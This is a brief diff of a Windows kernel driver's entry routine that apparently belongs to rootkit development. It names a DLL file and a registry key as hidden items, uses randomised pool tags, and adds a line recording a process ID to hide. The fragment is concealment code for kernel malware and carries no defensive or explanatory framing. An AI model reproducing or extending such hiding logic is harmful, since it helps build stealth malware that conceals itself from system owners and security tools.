@@ -79,6 +79,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");
 	RtlInitUnicodeString(&hiddenReg, L"fhsys");
+	hiddenDriverPid = PsGetCurrentProcessId();
 
 	keyArrLock = ExAllocatePoolWithTag(NonPagedPool, sizeof(KSPIN_LOCK) + MAX_KEYHANDLEARR * sizeof(HANDLE), rand_tag(&state));
 	keyHandleArr = (PHANDLE)(((uint8_t*)keyArrLock) + sizeof(KSPIN_LOCK));
